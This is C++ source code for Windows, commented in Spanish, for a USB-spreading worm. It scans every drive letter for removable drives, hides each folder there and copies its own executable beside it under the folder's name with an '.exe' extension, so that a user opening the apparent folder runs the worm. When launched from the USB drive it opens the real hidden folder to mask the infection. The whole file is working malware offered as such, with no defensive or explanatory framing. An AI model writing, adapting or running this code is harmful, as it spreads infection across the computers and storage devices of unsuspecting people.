#include <windows.h>
#include<iostream>

char *url;

void infectar(char *nombre)
{
    char lol[MAX_PATH]="";
    strcat(lol,nombre);
    CopyFile(url,lol,true); //si el archivo existe no lo reemplaza
}

void limpiar(char *a)
{
    for(int c=0;c<30;c++)
    {
        a[c]=0;
    }
}

void listar_Directorios(char *dir)
{
    WIN32_FIND_DATA find,f;
    HANDLE hFind,ad;
    char b[MAX_PATH]="";
    strcat(dir,"\\");
    strcat(b,dir);
    strcat (dir,"*");
    hFind = FindFirstFile(dir, &find);
    limpiar(dir);
    
    if(hFind != INVALID_HANDLE_VALUE)
    {   
        strcat(dir,b);
        strcat(dir,find.cFileName);   
        
        if(find.dwFileAttributes == 18) //Verifica si el archivo esta oculto 
        {
            strcat(dir,".exe");
            ad=FindFirstFile(dir, &f);
		}
			
        if(find.dwFileAttributes == 16) //Si es una carpeta y no se encuentra oculta
        {
            SetFileAttributes(dir,18); //Hace Oculta a la carpeta
            strcat(dir,".exe");
            infectar(dir);             //Infecta a la carpeta
        }
		limpiar(dir);
        }
        while (FindNextFile(hFind, &find) != 0)
        {
            strcat(dir,b);    
            strcat(dir,find.cFileName);   
            //MessageBox(NULL,a,"Intentando",MB_OK);     
            if(find.dwFileAttributes == 18)
            {
                strcat(dir,".exe");
               // MessageBox(NULL,a,"Buscando",MB_OK);     
                ad=FindFirstFile(dir, &f);
            }
            if(find.dwFileAttributes == 16)
            {
                SetFileAttributes(dir,18);
                strcat(dir,".exe");
                infectar(dir);
            }
            limpiar(dir);            
        }
}

void search_USB()
{
    char letter[4]="A:\0";
    for(letter[0]='A'; letter[0]<='Z';letter[0]+=1)
    {
        if(GetDriveType(letter) == DRIVE_REMOVABLE) 
        {
            //MessageBox(NULL,letter,"USB",MB_OK);
            listar_Directorios(letter);
        }
    } 
}

int main (int argc, char**args)
{
    url=args[0];
    char r[MAX_PATH];
    char execute[MAX_PATH]="";
    int c=0,x=0;
    r[0]=args[0][0];                                   
    r[1]=args[0][1];
    r[2]='\0'; 
    if(GetDriveType(r) == DRIVE_REMOVABLE)      //verifica de donde se ejecuta la infeccion
    {
        while(args[0][c]!='\0')
        {
            if((args[0][c]=='\\') || x>0)
            {
                if(args[0][c]=='.'){break;}
                execute[x]=args[0][c];
                x++;
            }
            c++;    
        }
        execute[x]='\0';       
        strcat(r,execute);
        ShellExecute(NULL,"open","explorer.exe",r,"",3);
    }
    else
    {
        search_USB();
    }
    return 0;
} 
